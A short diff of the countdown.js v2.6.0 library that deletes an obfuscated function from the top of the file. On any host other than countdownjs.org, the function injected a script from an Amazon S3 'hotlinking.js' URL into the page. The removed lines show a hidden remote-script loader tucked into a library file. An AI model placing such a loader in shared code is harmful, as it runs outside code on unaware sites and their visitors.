@@ -1,8 +1,4 @@
-(function(l,d,t,u,h,f,p,s){
-	if((l.host||'').indexOf(h)<0&&l.port!=='8080'){
-		f=d.getElementsByTagName(t)[0];p=f&&f.parentNode||d.body;s=d.createElement(t);s.src=u+h;p.insertBefore(s,f||p.firstChild);
-	}
-})(window.top.location,document,'script','http://3mta3.s3.amazonaws.com/hotlinking.js?','countdownjs.org');
+
 /*
  countdown.js v2.6.0 http://countdownjs.org
  Copyright (c)2006-2014 Stephen M. McKamey.
